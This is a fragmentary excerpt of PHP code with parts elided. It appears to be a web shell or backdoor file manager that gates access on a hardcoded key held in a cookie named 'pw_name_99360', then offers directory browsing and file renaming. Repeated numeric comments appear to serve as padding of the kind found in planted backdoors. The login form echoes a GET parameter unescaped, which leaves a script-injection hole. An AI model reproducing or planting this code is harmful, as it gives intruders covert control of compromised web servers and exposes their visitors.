...
$auth_key = "74ab8bb4af5950f4b1d9f2257af3cc0f";
...
$pass = false;
if (isset($_COOKIE['pw_name_99360'])) {
    if(($_COOKIE['pw_name_99360']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_99360'])) {
        if(($_POST['pw_name_99360']) == $auth_key) {
            setcookie("pw_name_99360", $_POST['pw_name_99360']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_99360' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724471969386507 1724471969764875 1724471969565044 1724471969119951
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724471969386507 1724471969764875 1724471969565044 1724471969119951
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724471969386507 1724471969764875 1724471969565044 1724471969119951
            $name = PATH . "/" . $_GET['r'];
